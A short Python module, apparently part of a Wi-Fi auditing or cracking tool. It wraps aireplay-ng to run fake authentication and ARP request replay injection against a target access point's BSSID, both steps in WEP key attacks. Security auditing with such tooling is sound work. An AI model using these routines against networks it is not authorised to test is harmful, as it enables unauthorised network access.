#!/usr/bin/env python3
from subprocess import DEVNULL, Popen

from tests import Test


class Aireplay:

    def fake_auth(self, target):
        # Performing fake authentication
        auth = Popen(["aireplay-ng", "-1", "0", "-a", target.bssid, Test.interface], stdout=DEVNULL, stderr=DEVNULL)
        return auth

    def arp_requesting(self, target):
        # ARP requesting in replay mode
        airodump_arp_req = Popen(
            ["aireplay-ng", "-3", "-b", target.bssid, Test.interface], stdout=DEVNULL, stderr=DEVNULL)
        return airodump_arp_req
